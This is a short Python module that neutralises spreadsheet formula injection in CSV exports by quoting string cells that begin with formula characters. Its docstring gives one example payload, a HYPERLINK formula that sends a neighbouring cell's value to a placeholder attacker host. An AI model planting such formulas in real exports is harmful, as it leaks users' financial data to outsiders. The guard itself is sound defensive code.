"""
CSV formula-injection guard for exports.

Excel, LibreOffice and Google Sheets run a cell that starts with =, +, - or @
as a formula, and treat a leading tab or carriage return the same way after
trimming. Exported cells carry text users typed (Remark, Invoice Number,
Project, and edits through public links), so a Remark of
=HYPERLINK("https://evil.example/?d="&B2,"details") becomes a live link that
leaks neighbouring cells when finance opens the file.

A leading single quote makes the spreadsheet show the value as plain text. Only
strings are touched: numbers, negative ones included, are written as numbers.
"""

from __future__ import annotations

from typing import Any, Iterable

_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe_cell(value: Any) -> Any:
    """`value`, with a leading quote added if a spreadsheet would run it as a formula."""
    if isinstance(value, str) and value.startswith(_FORMULA_PREFIXES):
        return "'" + value
    return value


def csv_safe_row(values: Iterable[Any]) -> list[Any]:
    return [csv_safe_cell(value) for value in values]
